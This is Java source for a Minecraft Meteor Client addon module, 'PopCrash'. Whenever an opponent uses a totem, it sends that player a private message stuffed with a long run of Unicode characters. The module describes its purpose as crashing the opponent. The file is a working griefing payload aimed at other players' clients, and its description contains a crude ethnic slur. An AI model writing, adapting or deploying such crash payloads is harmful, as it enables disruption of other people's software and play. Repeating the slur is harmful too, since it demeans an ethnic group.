package random.meteor.Modules.combat;

import it.unimi.dsi.fastutil.objects.Object2IntMap;
import it.unimi.dsi.fastutil.objects.Object2IntOpenHashMap;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.StringSetting;
import meteordevelopment.meteorclient.systems.friends.Friends;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.network.packet.s2c.play.EntityStatusS2CPacket;
import random.meteor.Main;

import java.util.UUID;

public class PopCrash extends Module {
    private final Object2IntMap<UUID> totemPopMap = new Object2IntOpenHashMap<>();

    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<Boolean> customMessage = sgGeneral.add(new BoolSetting.Builder()
            .name("custom-msg")
            .description("add you own lag message")
            .defaultValue(false)
            .build()
    );
    private final Setting<String> message = sgGeneral.add(new StringSetting.Builder()
            .name("message")
            .description("custom-message")
            .defaultValue("ENTER CRASH MESSAGE")
            .visible(customMessage::get)
            .build()
    );

    public PopCrash() {
        super(Main.COMBAT,"pop-crash","Crashes opponent by messaging them chisnense shit");
    }
    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) {
        if (!(event.packet instanceof EntityStatusS2CPacket player)) return;

        if (player.getStatus() != 35) return;

        Entity entity = player.getEntity(mc.world);

        if (!(entity instanceof PlayerEntity)) return;

        if ((entity.equals(mc.player))
                || (Friends.get().isFriend(((PlayerEntity) entity)))
        ) return;

        synchronized (totemPopMap) {
            int pops = totemPopMap.getOrDefault(entity.getUuid(), 0);
            totemPopMap.put(entity.getUuid(), ++pops);
                if(!customMessage.get()){
                    ChatUtils.sendPlayerMsg("/msg "+entity + "āȁ́Ёԁ\\u0601܁ࠁँਁଁก༁ခᄁሁጁᐁᔁᘁᜁ᠁ᤁᨁᬁᰁᴁḁἁ ℁∁⌁␁━✁⠁⤁⨁⬁Ⰱⴁ⸁⼁、\\u3101㈁㌁㐁㔁㘁㜁㠁㤁㨁㬁㰁㴁㸁㼁䀁䄁䈁䌁䐁䔁䘁䜁䠁䤁䨁䬁䰁䴁丁企倁儁刁匁吁唁嘁圁堁夁威嬁封崁币弁态愁戁持搁攁昁朁栁椁樁欁氁洁渁漁瀁焁爁猁琁甁瘁省码礁稁笁簁紁縁缁老脁舁茁萁蔁蘁蜁蠁褁訁");
                }
                else{
                    ChatUtils.sendPlayerMsg("/msg "+entity + message.get());
                }
        }
    }
}
